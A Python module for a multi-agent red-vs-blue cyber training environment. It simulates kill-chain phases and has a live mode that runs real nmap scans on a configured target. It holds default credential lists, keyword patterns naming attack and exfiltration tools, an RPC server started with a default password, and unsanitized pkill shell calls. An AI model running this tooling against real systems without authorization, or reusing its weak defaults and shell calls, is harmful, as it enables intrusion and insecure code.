# core/cyber_environment.py — ARIASKA Simulation Core v12.0 APEX PRIME
# 🌐 Unified Multi-Agent Arena | 🧠 Orion Strategic Oversight | ⚔️ Dynamic Red vs Blue Ops | 📊 Real-Time Adaptation

import random
import ipaddress
import subprocess
import json
from rich.console import Console
import numpy as np
import os
import socket
import time
import re
import traceback
import threading
from typing import Dict, Any, List, Tuple, Optional, Union

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    nmap = None
    NMAP_AVAILABLE = False
    
console = Console()


class CyberEnvironment:
    def __init__(self, scenario="dynamic", agent_manager=None, defer_reset=False):
        console.rule(
            "[bold cyan]🌐 Initializing CyberEnvironment v12.0 — Multi-Agent Combat Arena"
        )
        self.scenario = scenario
        
        # Enhanced network simulation components
        self.network_topology = self._create_network_topology()
        self.service_configs = self._initialize_service_configs()
        self.vulnerability_database = self._create_vulnerability_database()
        self.blue_team_state = self._initialize_blue_team()
        
        self.default_services = [
            "ftp",
            "ssh", 
            "http",
            "https",
            "smb",
            "rdp",
            "smtp",
            "mysql",
            "postgres",
            "telnet",
            "dns",
            "ldap",
            "snmp",
            "vnc",
            "imap"
        ]
        
        # Define cyber kill chain phases
        self.phases = ["recon", "enumeration", "exploit", "privesc", "exfiltrate", "closeout"]
        
        # PHASE 2A: Configurable phase transition thresholds
        # Can be overridden via set_phase_thresholds() for different target profiles
        # PHASE 3: Lowered defaults for simulation training — agents must learn
        # to advance through phases quickly in sim before tackling real targets
        self.phase_transitions = {
            "recon": {"threshold": 5, "next": "enumeration"},
            "enumeration": {"threshold": 4, "next": "exploit"},
            "exploit": {"threshold": 2, "next": "privesc"},
            "privesc": {"threshold": 1, "next": "exfiltrate"},
            "exfiltrate": {"threshold": 1, "next": "closeout"},
            "closeout": {"threshold": 2, "next": "complete"}
        }
        
        # Predefined target profiles for phase thresholds
        self.TARGET_PROFILES = {
            "default": {
                "recon": 5, "enumeration": 4, "exploit": 2,
                "privesc": 1, "exfiltrate": 1, "closeout": 2,
            },
            "simulation": {
                "recon": 3, "enumeration": 3, "exploit": 2,
                "privesc": 1, "exfiltrate": 1, "closeout": 2,
            },
            "metasploitable2": {
                "recon": 5,       # M2 has ~20 open ports, 5 is quick enough
                "enumeration": 4, # M2 has many services, 4 identified = ready
                "exploit": 2,     # M2 has easy vulns, 2 exploits = move on
                "privesc": 1,     # 1 privesc = move to exfil
                "exfiltrate": 1,
                "closeout": 2,    # 2 restore actions to complete
            },
            "metasploitable3": {
                "recon": 6,
                "enumeration": 5,
                "exploit": 2,
                "privesc": 1,
                "exfiltrate": 1,
                "closeout": 2,
            },
            "htb_easy": {
                "recon": 4, "enumeration": 3, "exploit": 2,
                "privesc": 1, "exfiltrate": 1, "closeout": 2,
            },
            "htb_hard": {
                "recon": 8, "enumeration": 6, "exploit": 3,
                "privesc": 2, "exfiltrate": 1, "closeout": 3,
            },
        }

        # Initialize all required attributes with default values
        self.difficulty_level = 1
        self.open_ports = []
        self.services = []
        self.service_banners = {}  # Map ports to service banner info
        self.discovered_vulnerabilities = []
        self.exploited_vulnerabilities = []
        self.successful_exploits = set()  # Track unique exploit successes
        self.target_ip = "10.10.10.10"
        self.hostname = "target"
        self.credentials_found = False
        self.privilege_level = "none"
        self.data_exfiltrated = False
        self.detection_risk = 0.0
        self.stealth_metric = 10.0  # Higher = stealthier
        self.blue_team_alert = 0.0
        self.honeypots = []
        self.previous_actions = []
        self.done = False
        self.current_phase = "recon"  # Default starting phase
        self.discovered_info = set()  # Track unique info discoveries
        self.phase_progress = {"recon": 0, "enumeration": 0, "exploit": 0, "privesc": 0, "exfiltrate": 0, "closeout": 0}
        self.active_shells = []
        self.active_processes = []
        
        # Missing attributes for various methods
        self.action_history = []
        self.agent_stealth_skill = 5.0  # Default stealth skill
        self.verbose = False
        self.steps_taken = 0
        self.mode = "simulated"  # Default mode
        self.compromised_hosts = set()
        
        # Live target settings (enhanced for Metasploitable 2)
        self.live_mode = os.environ.get("ARIASKA_LIVE_MODE", "false").lower() == "true"
        self.live_target_ip = os.environ.get("ARIASKA_TARGET_IP", "192.168.1.119")  # Default to Metasploitable 2
        self.live_target_port_range = os.environ.get("ARIASKA_PORT_RANGE", "1-1024")
        
        # Scanner settings
        self.scanner_lock = threading.Lock()  # Thread safety for scanner operations
        self.scan_timeout = int(os.environ.get("ARIASKA_SCAN_TIMEOUT", "120"))  # 2-minute timeout for scans
        self.scan_results_cache = {}  # Cache scan results to avoid redundant scans
        
        # Port scan history tracking (for redundancy penalties)
        self.port_scan_history = []  # Track recent port scan actions
        self.port_scan_window = 10   # Window size for detecting repeated scans
        self.redundant_scan_threshold = 3  # Number of similar scans to trigger penalty
        
        # Only set agent_manager if provided (prevents recursion)
        self.agent_manager = agent_manager
        self.stats_monitor = None
        self.orion_agent = None
        self.dynamic_profile = None
        self.max_difficulty = 20
        self.traceback_threshold = 75
        self.training_mode = "adaptive"
        self.blue_team_aggressiveness = 3

        # Only call reset_environment if not deferring
        if not defer_reset:
            self.reset_environment()

    def set_target_profile(self, profile_name: str) -> None:
        """
        Set phase transition thresholds from a predefined target profile.
        
        Args:
            profile_name: One of 'default', 'metasploitable2', 'metasploitable3',
                         'htb_easy', 'htb_hard'
        """
        if profile_name not in self.TARGET_PROFILES:
            raise ValueError(
                f"Unknown profile '{profile_name}'. "
                f"Available: {list(self.TARGET_PROFILES.keys())}"
            )
        thresholds = self.TARGET_PROFILES[profile_name]
        for phase, threshold in thresholds.items():
            if phase in self.phase_transitions:
                self.phase_transitions[phase]["threshold"] = threshold
    
    def set_phase_thresholds(self, thresholds: dict) -> None:
        """
        Set custom phase transition thresholds.
        
        Args:
            thresholds: Dict mapping phase name to threshold value.
                       e.g. {"recon": 5, "enumeration": 4}
        """
        for phase, threshold in thresholds.items():
            if phase in self.phase_transitions:
                self.phase_transitions[phase]["threshold"] = int(threshold)

    def initialize_dynamic_parameters(self):
        # Delay the import of AgentManager to avoid circular imports
        from core.utils.stats_monitor import StatsMonitor

        # Initialize StatsMonitor with safe agent access
        if self.agent_manager is not None and hasattr(self.agent_manager, 'all_agents'):
            try:
                agent_ids = [agent.agent_id for agent in self.agent_manager.all_agents()]
                self.stats_monitor = StatsMonitor()
            except AttributeError:
                self.stats_monitor = StatsMonitor()
        else:
            self.stats_monitor = StatsMonitor()
            
        # Safe access to orion_agent
        if self.agent_manager is not None and hasattr(self.agent_manager, 'orion_agent'):
            self.orion_agent = self.agent_manager.orion_agent
        else:
            self.orion_agent = None

        # Safe dynamic profile generation
        if self.orion_agent is not None:
            self.dynamic_profile = self.orion_agent.generate_dynamic_scenario(
                self.scenario, self.default_services
            )
        else:
            self.dynamic_profile = {
                "difficulty": 20,
                "traceback_threshold": 75,
                "training_mode": "adaptive",
                "blue_aggressiveness": 3,
                "services": random.sample(self.default_services, 5)
            }
        self.max_difficulty = self.dynamic_profile.get("difficulty", 20)
        self.traceback_threshold = self.dynamic_profile.get("traceback_threshold", 75)
        self.training_mode = self.dynamic_profile.get("training_mode", "adaptive")
        self.blue_team_aggressiveness = self.dynamic_profile.get(
            "blue_aggressiveness", 3
        )
        
        # Initialize environment context detector if available
        try:
            from core.environment.environment_context_detector import EnvironmentContextDetector
            self.context_detector = EnvironmentContextDetector()
            console.print("[green]✔ Environment Context Detector initialized[/green]")
        except ImportError:
            self.context_detector = None
            console.print("[yellow]⚠ Environment Context Detector not available[/yellow]")

    def reset_environment(self):
        try:
            console.print("[green]🔄 Resetting Environment State[/green]")
            
            # Clean up any active sessions or processes
            self._cleanup_active_sessions()
            
            # Reset scan cache
            self.scan_results_cache = {}
            self.port_scan_history = []
            
            # Dynamically adjust difficulty based on agent performance
            avg_reward = None
            if self.agent_manager and hasattr(self.agent_manager, "red_agent") and getattr(self.agent_manager, "red_agent", None) is not None:
                red_agent = self.agent_manager.red_agent
                if hasattr(red_agent, "stats_monitor"):
                    avg_reward = red_agent.stats_monitor.get_average_reward()
            # Scale difficulty: higher reward → higher difficulty
            if avg_reward is not None:
                if avg_reward > 20:
                    self.difficulty_level = min(getattr(self, "difficulty_level", 1) + 1, self.max_difficulty)
                elif avg_reward < 5:
                    self.difficulty_level = max(getattr(self, "difficulty_level", 1) - 1, 1)
                else:
                    self.difficulty_level = getattr(self, "difficulty_level", 1)
            else:
                self.difficulty_level = 1
            
            # Initialize all attributes needed by get_global_state
            self.current_phase = "recon"
            self.phase_progress = {"recon": 0, "enumeration": 0, "exploit": 0, "privesc": 0, "exfiltrate": 0, "closeout": 0}
            self.discovered_info = set()
            
            # In live mode, we don't generate random ports and services, but start with empty lists
            if self.live_mode:
                # Initialize with empty lists for live mode - will be populated during scanning
                self.open_ports = []
                self.services = []
                self.service_banners = {}
                self.target_ip = self.live_target_ip
                self.hostname = self.live_target_ip
            else:
                # For simulated mode, generate random ports and services
                self.open_ports = sorted(
                    random.sample(range(20, 10000), k=random.randint(6, 12))
                )
                self.services = (
                    self.dynamic_profile.get("services", random.sample(self.default_services, 5))
                    if self.dynamic_profile else random.sample(self.default_services, 5)
                )
                self.service_banners = {}
                self.target_ip = self._generate_random_ip()
                self.hostname = f"target-{random.randint(100,999)}"
                
            # Reset state variables
            self.discovered_vulnerabilities = []
            self.exploited_vulnerabilities = []
            self.successful_exploits = set()
            self.credentials_found = False
            self.privilege_level = "none"
            self.data_exfiltrated = False
            self.detection_risk = 0.0
            self.stealth_metric = 10.0
            self.blue_team_alert = 0.0
            self.honeypots = []
            self.previous_actions = []
            self.done = False
            self.active_shells = []
            self.active_processes = []
            
            # Apply domain randomization if context detector available
            if not self.live_mode and hasattr(self, "context_detector") and self.context_detector:
                randomized_params = self.context_detector.randomize_domain()
                # Apply randomized parameters to environment
                if "ports" in randomized_params and randomized_params["ports"]:
                    self.open_ports = sorted(randomized_params["ports"])
                if "services" in randomized_params and randomized_params["services"]:
                    self.services = randomized_params["services"]
            
            # Create/update state object for agents
            self.state = self.get_global_state()
        except Exception as e:
            console.print(f"[red]❌ Error during environment reset: {e}[/red]")
            console.print(traceback.format_exc())

    def reset(self):
        """Compatibility wrapper for RL agent code."""
        try:
            self.reset_environment()
            return self.get_global_state()
        except Exception as e:
            console.print(f"[red]❌ Error during environment reset: {e}[/red]")
            return {}

    def _cleanup_active_sessions(self):
        """Clean up any active shells, connections, or processes"""
        # Kill active shells (if using real target)
        for shell in self.active_shells:
            try:
                if hasattr(shell, "terminate"):
                    shell.terminate()
                elif isinstance(shell, str):
                    # If shell ID is stored as string, try to kill the process
                    if self.live_mode:
                        os.system(f"pkill -f {shell}")
            except Exception as e:
                console.print(f"[yellow]⚠ Error terminating shell: {e}[/yellow]")
                
        # Kill active processes
        for proc in self.active_processes:
            try:
                if hasattr(proc, "terminate"):
                    proc.terminate()
                elif isinstance(proc, str):
                    if self.live_mode:
                        os.system(f"pkill -f {proc}")
            except Exception as e:
                console.print(f"[yellow]⚠ Error terminating process: {e}[/yellow]")
                
        # If using Metasploit, reset all sessions
        if self.live_mode:
            try:
                # Kill any Metasploit processes
                os.system("pkill -f metasploit")
                os.system("pkill -f msfconsole")
                os.system("pkill -f msfrpcd")
                
                # Optionally, restart Metasploit RPC if needed
                metasploit_rpc_port = os.environ.get("METASPLOIT_RPC_PORT", "55553")
                metasploit_rpc_user = os.environ.get("METASPLOIT_RPC_USER", "msf")
                metasploit_rpc_pass = os.environ.get("METASPLOIT_RPC_PASS", "password")
                
                if os.environ.get("RESTART_METASPLOIT_RPC", "false").lower() == "true":
                    console.print("[yellow]⚙️ Restarting Metasploit RPC server...[/yellow]")
                    start_cmd = f"msfrpcd -P {metasploit_rpc_pass} -U {metasploit_rpc_user} -p {metasploit_rpc_port} -a 127.0.0.1 -f"
                    subprocess.Popen(start_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    time.sleep(5)  # Give time for the RPC server to start
            except Exception as e:
                console.print(f"[yellow]⚠ Error handling Metasploit: {e}[/yellow]")
                
        # Clear active shells and processes lists
        self.active_shells = []
        self.active_processes = []

    def _generate_random_ip(self):
        while True:
            ip = ipaddress.IPv4Address(random.randint(1 << 24, (1 << 32) - 1))
            if not (
                ip.is_private or ip.is_reserved or ip.is_loopback or ip.is_multicast
            ):
                return str(ip)
    
    def _create_network_topology(self) -> Dict[str, Any]:
        """Create realistic network topology with multiple subnets."""
        topology = {
            "dmz": {
                "subnet": "192.168.1.0/24",
                "hosts": {},
                "gateway": "192.168.1.1",
                "description": "DMZ - Public facing services"
            },
            "internal": {
                "subnet": "10.0.0.0/24", 
                "hosts": {},
                "gateway": "10.0.0.1",
                "description": "Internal network - Corporate systems"
            },
            "admin": {
                "subnet": "172.16.0.0/24",
                "hosts": {},
                "gateway": "172.16.0.1", 
                "description": "Admin network - Management systems"
            }
        }
        
        # Populate hosts in each subnet
        for subnet_name, subnet_info in topology.items():
            hosts = self._generate_subnet_hosts(subnet_name, subnet_info["subnet"])
            topology[subnet_name]["hosts"] = hosts
            
        return topology
    
    def _generate_subnet_hosts(self, subnet_name: str, subnet_cidr: str) -> Dict[str, Dict]:
        """Generate hosts for a specific subnet."""
        network = ipaddress.IPv4Network(subnet_cidr)
        hosts = {}
        
        # Number of hosts based on subnet type
        host_counts = {"dmz": 5, "internal": 8, "admin": 3}
        num_hosts = host_counts.get(subnet_name, 5)
        
        host_ips = list(network.hosts())[:num_hosts]
        
        for i, ip in enumerate(host_ips):
            host_id = f"{subnet_name}-host-{i+1}"
            hosts[str(ip)] = {
                "hostname": f"{subnet_name}-{i+1:02d}",
                "os": random.choice(["Windows 10", "Windows Server 2019", "Ubuntu 20.04", "CentOS 8", "Red Hat 8"]),
                "services": self._generate_host_services(subnet_name),
                "vulnerabilities": [],
                "access_level": "none",
                "detected": False,
                "compromised": False
            }
            
        return hosts
    
    def _generate_host_services(self, subnet_type: str) -> Dict[int, Dict]:
        """Generate services for a host based on subnet type.""" 
        services = {}
        
        if subnet_type == "dmz":
            # DMZ hosts have public-facing services
            possible_services = {
                80: {"name": "http", "version": "Apache 2.4.41", "state": "open"},
                443: {"name": "https", "version": "Apache 2.4.41", "state": "open"},
                22: {"name": "ssh", "version": "OpenSSH 8.2", "state": "open"},
                21: {"name": "ftp", "version": "vsftpd 3.0.3", "state": "open"},
                25: {"name": "smtp", "version": "Postfix 3.4.13", "state": "open"}
            }
        elif subnet_type == "internal":
            # Internal hosts have corporate services
            possible_services = {
                22: {"name": "ssh", "version": "OpenSSH 7.4", "state": "open"},
                445: {"name": "smb", "version": "Samba 4.10.16", "state": "open"},
                3389: {"name": "rdp", "version": "MS-WBT-Server", "state": "open"},
                3306: {"name": "mysql", "version": "MySQL 8.0.25", "state": "open"},
                5432: {"name": "postgres", "version": "PostgreSQL 13.3", "state": "open"}
            }
        else:  # admin
            # Admin hosts have management services
            possible_services = {
                22: {"name": "ssh", "version": "OpenSSH 8.0", "state": "open"},
                443: {"name": "https", "version": "nginx 1.18.0", "state": "open"},
                161: {"name": "snmp", "version": "Net-SNMP 5.8", "state": "open"},
                5900: {"name": "vnc", "version": "VNC 4.1.3", "state": "open"}
            }
            
        # Randomly select 2-4 services for each host
        num_services = random.randint(2, 4)
        selected_ports = random.sample(list(possible_services.keys()), min(num_services, len(possible_services)))
        
        for port in selected_ports:
            services[port] = possible_services[port].copy()
            
        return services
    
    def _initialize_service_configs(self) -> Dict[str, Dict]:
        """Initialize detailed service configurations."""
        return {
            "ssh": {
                "default_creds": [("admin", "admin"), ("root", "toor"), ("user", "password")],
                "exploit_paths": ["CVE-2021-4034", "weak_creds", "key_reuse"],
                "detection_signatures": ["repeated_login_attempts", "unusual_login_times"]
            },
            "http": {
                "default_creds": [("admin", "admin"), ("guest", "guest")],
                "exploit_paths": ["sql_injection", "xss", "directory_traversal", "CVE-2021-44228"],
                "detection_signatures": ["unusual_user_agents", "sql_patterns", "directory_enumeration"]
            },
            "smb": {
                "default_creds": [("guest", ""), ("admin", "password")],
                "exploit_paths": ["CVE-2017-0144", "null_session", "weak_creds"],
                "detection_signatures": ["unusual_smb_traffic", "failed_auth_attempts"]
            },
            "mysql": {
                "default_creds": [("root", ""), ("admin", "admin"), ("user", "user")],
                "exploit_paths": ["sql_injection", "weak_creds", "CVE-2021-2146"],
                "detection_signatures": ["unusual_queries", "privilege_escalation_attempts"]
            }
        }
    
    def _create_vulnerability_database(self) -> Dict[str, Dict]:
        """Create database of realistic vulnerabilities."""
        return {
            "CVE-2021-4034": {
                "name": "PwnKit Local Privilege Escalation",
                "services": ["ssh", "linux_system"],
                "severity": "high",
                "success_rate": 0.9,
                "detection_chance": 0.3,
                "impact": "privilege_escalation"
            },
            "CVE-2021-44228": {
                "name": "Log4j Remote Code Execution",
                "services": ["http", "https"],
                "severity": "critical",
                "success_rate": 0.8,
                "detection_chance": 0.5,
                "impact": "remote_code_execution"
            },
            "CVE-2017-0144": {
                "name": "EternalBlue SMB Remote Code Execution",
                "services": ["smb"],
                "severity": "critical", 
                "success_rate": 0.7,
                "detection_chance": 0.6,
                "impact": "remote_code_execution"
            },
            "weak_credentials": {
                "name": "Weak/Default Credentials",
                "services": ["ssh", "http", "mysql", "rdp"],
                "severity": "medium",
                "success_rate": 0.6,
                "detection_chance": 0.4,
                "impact": "unauthorized_access"
            }
        }
    
    def _initialize_blue_team(self) -> Dict[str, Any]:
        """Initialize blue team defensive capabilities."""
        return {
            "alertness_level": 0.3,  # 0.0 = asleep, 1.0 = maximum alert
            "detection_rules": {
                "port_scan": {"threshold": 5, "confidence": 0.8},
                "brute_force": {"threshold": 3, "confidence": 0.9},
                "exploit_attempt": {"threshold": 1, "confidence": 0.7},
                "lateral_movement": {"threshold": 2, "confidence": 0.8}
            },
            "response_capabilities": {
                "block_ip": True,
                "kill_process": True,
                "isolate_host": True,
                "patch_vulnerability": False  # Requires time
            },
            "honeypots": [],
            "active_monitoring": True,
            "incident_response_time": 300  # 5 minutes
        }

    def get_state(self):
        """Get current environment state for agent decision making."""
        return self.get_global_state()

    def get_global_state(self):
        # Build state_flags for SmartCoach compatibility
        state_flags = {
            "ports_discovered": len(self.open_ports) > 0,
            "services_enumerated": len(self.services) > 0,
            "ssh_service_found": "ssh" in self.services or any("ssh" in str(s).lower() for s in self.services),
            "http_service_found": "http" in self.services or any("http" in str(s).lower() for s in self.services),
            "smb_service_found": "smb" in self.services or any("smb" in str(s).lower() for s in self.services),
            "ftp_service_found": "ftp" in self.services or any("ftp" in str(s).lower() for s in self.services),
            "mysql_service_found": "mysql" in self.services or any("mysql" in str(s).lower() for s in self.services),
            "vulnerability_found": len(self.discovered_vulnerabilities) > 0,
            "credentials_known": self.credentials_found,
            "shell_obtained": self.privilege_level in ("user", "root"),
            "linux_shell_obtained": self.privilege_level in ("user", "root"),  # Assume linux for now
            "root_shell_obtained": self.privilege_level == "root",
            "admin_credentials_known": self.privilege_level == "root",
        }
        
        return {
            "phase": self.current_phase,
            "open_ports": self.open_ports,
            "services": self.services,
            "service_banners": self.service_banners,
            "discovered_vulnerabilities": self.discovered_vulnerabilities,
            "exploited_vulnerabilities": self.exploited_vulnerabilities,
            "credentials_found": self.credentials_found,
            "privilege_level": self.privilege_level,
            "data_exfiltrated": self.data_exfiltrated,
            "detection_risk": round(self.detection_risk, 2),
            "stealth_metric": round(self.stealth_metric, 2),
            "blue_team_alert": round(self.blue_team_alert, 2),
            "target_ip": self.target_ip,
            "hostname": self.hostname,
            "scenario": self.scenario,
            "difficulty": self.difficulty_level,
            "honeypots": self.honeypots,
            "done": self.done,
            "phase_progress": self.phase_progress,
            "live_mode": self.live_mode,
            "state_flags": state_flags,  # For SmartCoach compatibility
        }

    # ─────────────────────────────────────────────
    # 🎮 Multi-Agent Step Execution
    # ─────────────────────────────────────────────
    def step(self, action=None, agent_actions=None, event_log=None):
        """
        Improved step method with better error handling, agent coordination, and visualization.
        Accepts either a single action (legacy) or a batch of agent_actions (event-driven).
        Optionally logs all transitions to the shared event log.
        """
        try:
            if self.done:
                console.print(
                    "[yellow]⚠ Environment already completed. Reset required.[/yellow]"
                )
                if event_log is not None:
                    event_log.append({"event_type": "env_transition", "done": True, "state": self.get_global_state()})
                return self.get_global_state(), 0, True, {}
                
            # --- Process Action ---
            reward = 0
            info = {}
            
            if isinstance(action, str):
                # Process string command
                reward, info = self._process_command(action)
            elif agent_actions and isinstance(agent_actions, list):
                # Apply all agent actions in batch (e.g., RedAgent, BlueAgent, etc.)
                for agent_event in agent_actions:
                    agent_id = agent_event.get("agent_id")
                    command = agent_event.get("command")
                    # For RedAgent, process as main action
                    if agent_id == "RedAgent":
                        agent_reward, agent_info = self._process_command(command)
                        reward = agent_reward
                        info = agent_info
                        if event_log is not None:
                            event_log.append({
                                "event_type": "env_transition", 
                                "agent_id": agent_id, 
                                "command": command,
                                "reward": agent_reward,
                                "info": agent_info
                            })
                    # For BlueAgent, process as defense (if needed)
                    elif agent_id == "BlueAgent":
                        blue_result = self._process_blue_defense(command)
                        if event_log is not None:
                            event_log.append({
                                "event_type": "env_defense",
                                "agent_id": agent_id,
                                "command": command,
                                "result": blue_result
                            })
            else:
                # Process phase/action index as in original implementation
                if isinstance(action, str) and action in self.phases:
                    self.current_phase = action
                    self._adjust_risks(self.current_phase)
                    
                    # If phase is explicitly set to exfiltrate and we have root, complete the mission
                    if self.current_phase == "exfiltrate" and self.privilege_level == "root":
                        self.data_exfiltrated = True
                        self.done = True
                        reward = 65.0
                    
                    # Enhanced visualization for phase change
                    self._visualize_state_change("Phase change", {"phase": self.current_phase})
                    info = {"message": f"Phase changed to {self.current_phase}"}
                elif isinstance(action, int) and 0 <= action < len(self.phases):
                    self.current_phase = self.phases[action]
                    self._adjust_risks(self.current_phase)
                    info = {"message": f"Phase changed to {self.current_phase}"}
                else:
                    reward = -0.5
                    info = {"message": "Unknown action type"}
            
            self._check_phase_transition()
            
            state = self.get_global_state()
            
            return state, reward, self.done, info
            
        except Exception as e:
            console.print(f"[red]❌ Error in environment step: {e}[/red]")
            console.print(traceback.format_exc())
            return self.get_global_state(), -1.0, False, {"error": str(e)}

    def _process_command(self, command: str) -> Tuple[float, Dict[str, Any]]:
        """
        Process a command string and update environment state accordingly.
        Returns: (reward, info_dict)
        """
        self.previous_actions.append(command)
        
        cmd_type = self._detect_command_type(command)
        info = {"command_type": cmd_type, "success": False}
        
        if cmd_type == "scan":
            return self._process_scan_command(command)
        elif cmd_type == "enum":
            return self._process_enum_command(command)
        elif cmd_type == "exploit":
            return self._process_exploit_command(command)
        elif cmd_type == "privesc":
            return self._process_privesc_command(command)
        elif cmd_type == "exfil":
            return self._process_exfil_command(command)
        else:
            info["message"] = f"Unknown command type for: {command}"
            self._increase_detection(0.1)
            return -0.5, info

    def _detect_command_type(self, command: str) -> str:
        """Determine command type (scan, enum, exploit, privesc, exfil)"""
        if not command or not isinstance(command, str):
            return "unknown"
            
        command = command.lower()
        
        if re.search(r'nmap|masscan|ping|port\s+scan|scan\s+target|find\s+ports|detect\s+services', command):
            return "scan"
            
        if re.search(r'gobuster|enum4linux|dirb|wpscan|nikto|whatweb|dirbuster|dir\s+scan|directory|enumerate|find\s+files', command):
            return "enum"
            
        if re.search(r'exploit|msf|metasploit|sqlmap|hydra|brute\s*force|crack|msfvenom|attack|vuln|cve', command):
            return "exploit"
            
        if re.search(r'sudo|su\s+root|linpeas|winpeas|privilege|escalat|priv\s+esc|root|admin|kernel\s+exploit', command):
            return "privesc"
            
        if re.search(r'zip|tar|scp|exfil|copy|download|data\s+extract|transfer|steal', command):
            return "exfil"
            
        return "scan"

    def _process_scan_command(self, command: str) -> Tuple[float, Dict[str, Any]]:
        """
        Process port scanning commands like nmap, masscan, etc.
        Updates discovered ports and returns reward.
        """
        info = {"command_type": "scan", "success": False, "new_discoveries": []}
        reward = 0.0
        
        target_match = re.search(r'\b(\d{1,3}(\.\d{1,3}){3})\b', command)
        target = target_match.group(1) if target_match else self.target_ip
        
        self.port_scan_history.append({
            "target": target,
            "command": command,
            "timestamp": time.time()
        })
        if len(self.port_scan_history) > self.port_scan_window:
            self.port_scan_history = self.port_scan_history[-self.port_scan_window:]
        
        recent_scans = [scan for scan in self.port_scan_history 
                       if scan["target"] == target and time.time() - scan["timestamp"] < 300]
        
        similar_command_count = 0
        current_cmd_base = command.split()[0] if command and ' ' in command else command
        for scan in recent_scans:
            scan_cmd_base = scan["command"].split()[0] if scan["command"] and ' ' in scan["command"] else scan["command"]
            if scan_cmd_base == current_cmd_base:
                similar_command_count += 1
        
        if similar_command_count >= self.redundant_scan_threshold:
            info["message"] = "Redundant scan detected. Consider changing approach or scan parameters."
            penalty_factor = min(3.0, 0.5 + (similar_command_count - self.redundant_scan_threshold) * 0.5)
            self._increase_detection(0.2 * penalty_factor)
            reward = -1.0 * penalty_factor
            return reward, info
        
        new_ports = []
        
        if self.live_mode:
            new_ports = self._perform_live_scan(target, command)
            scan_key = f"{target}_{command.split()[0]}"
            self.scan_results_cache[scan_key] = {
                "timestamp": time.time(),
                "ports": new_ports.copy() if isinstance(new_ports, list) else []
            }
        else:
            scan_quality = self._calculate_scan_quality(command)
            
            all_ports = set(self.open_ports)
            discovered = set([p for p in self.open_ports if p in self.service_banners])
            undiscovered = all_ports - discovered
            
            num_to_reveal = max(1, int(len(undiscovered) * scan_quality))
            if undiscovered:
                new_ports = random.sample(list(undiscovered), min(num_to_reveal, len(undiscovered)))
                
                for port in new_ports:
                    service = random.choice(self.services)
                    self.service_banners[port] = self._generate_service_banner(service, port)
                    info["new_discoveries"].append(f"Port {port}: {service}")
                    
                    self.discovered_info.add(f"port_{port}")
                
                reward = len(new_ports) * 2.0
                info["success"] = True
                info["message"] = f"Scan revealed {len(new_ports)} new ports"
                
                self.phase_progress["recon"] += len(new_ports)
                
                if "sS" in command or "stealth" in command:
                    self._increase_detection(0.1)
                elif "sV" in command or "version" in command:
                    self._increase_detection(0.4)
                else:
                    self._increase_detection(0.2)
            else:
                info["message"] = "Scan complete, but no new ports discovered"
                reward = -0.5
                
        return reward, info

    def _perform_live_scan(self, target: str, scan_command: str) -> List[int]:
        """
        Perform actual scan against live target (for live mode only)
        Returns list of discovered ports
        """
        if not self.live_mode:
            console.print("[yellow]⚠ Live scanning attempted in simulation mode[/yellow]")
            return []
            
        cache_key = f"{target}_{scan_command.split()[0]}"
        if cache_key in self.scan_results_cache:
            cache_entry = self.scan_results_cache[cache_key]
            if time.time() - cache_entry["timestamp"] < 300:
                console.print("[cyan]ℹ Using cached scan results[/cyan]")
                return cache_entry["ports"]
                
        discovered_ports = []
        service_info = {}
        
        try:
            with self.scanner_lock:
                console.print(f"[cyan]🔍 Scanning {target}...[/cyan]")
                
                if NMAP_AVAILABLE and nmap is not None:
                    try:
                        scanner = nmap.PortScanner()
                        
                        port_range = self.live_target_port_range
                        port_match = re.search(r'-p\s+(\S+)', scan_command)
                        if port_match:
                            port_range = port_match.group(1)
                            
                        scan_type = ""
                        if "-sS" in scan_command:
                            scan_type = "-sS"
                        elif "-sT" in scan_command:
                            scan_type = "-sT"
                        elif "-sV" in scan_command:
                            scan_type = "-sV"
                        elif "-A" in scan_command:
                            scan_type = "-A"
                            
                        args = f"-p {port_range} {scan_type}"
                        
                        scanner.scan(target, arguments=args, timeout=self.scan_timeout)
                        
                        if target in scanner.all_hosts():
                            for proto in scanner[target].all_protocols():
                                ports = scanner[target][proto].keys()
                                for port in ports:
                                    discovered_ports.append(int(port))
                                    service = scanner[target][proto][port]
                                    banner = f"{service.get('name', 'unknown')} {service.get('product', '')} {service.get('version', '')}"
                                    self.service_banners[int(port)] = banner.strip()
                                    service_info[port] = service
                                    
                                    service_name = service.get('name', '').lower()
                                    if service_name and service_name not in self.services:
                                        self.services.append(service_name)
                    except Exception as nmap_err:
                        console.print(f"[red]❌ Error using python-nmap: {nmap_err}[/red]")
                
                if not NMAP_AVAILABLE or nmap is None:
                    try:
                        cmd = ["nmap"]
                        
                        for arg in ["-p", "-sS", "-sV", "-A"]:
                            if arg in scan_command:
                                idx = scan_command.find(arg)
                                value_match = re.search(r'{}([\s=]+(\S+))'.format(arg), scan_command)
                                if value_match and len(value_match.groups()) >= 2:
                                    cmd.extend([arg, value_match.group(2)])
                                else:
                                    cmd.append(arg)
                        
                        cmd.append(target)
                        
                        result = subprocess.run(
                            cmd,
                            capture_output=True, 
                            text=True, 
                            timeout=self.scan_timeout
                        )
                        
                        for line in result.stdout.splitlines():
                            port_match = re.search(r'(\d+)/tcp\s+open', line)
                            if port_match:
                                port = int(port_match.group(1))
                                discovered_ports.append(port)
                                
                                service_match = re.search(r'open\s+(\S+)(?:\s+(.*))?$', line)
                                if service_match:
                                    service_name = service_match.group(1)
                                    service_details = service_match.group(2) if service_match.lastindex and service_match.lastindex >= 2 else ""
                                    self.service_banners[port] = f"{service_name} {service_details}".strip()
                                    
                                    if service_name.lower() not in self.services:
                                        self.services.append(service_name.lower())
                    except subprocess.TimeoutExpired:
                        console.print("[red]❌ Scan timeout - scan taking too long[/red]")
                    except Exception as e:
                        console.print(f"[red]❌ Error during subprocess scan: {e}[/red]")
                
                for port in discovered_ports:
                    if port not in self.open_ports:
                        self.open_ports.append(port)
                self.open_ports.sort()
                
                self.scan_results_cache[cache_key] = {
                    "timestamp": time.time(),
                    "ports": discovered_ports.copy()
                }
                
                console.print(f"[green]✓ Scan complete. Found {len(discovered_ports)} open ports on {target}[/green]")
                return discovered_ports
                
        except Exception as e:
            console.print(f"[red]❌ Error during live scan: {e}[/red]")
            console.print(traceback.format_exc())
            return []

    def _calculate_scan_quality(self, command: str) -> float:
        """Calculate scan quality/effectiveness based on command options"""
        quality = 0.3
        
        if "-p-" in command or "-p 1-65535" in command:
            quality += 0.3
        if "-sV" in command:
            quality += 0.2
        if "-sS" in command:
            quality += 0.1
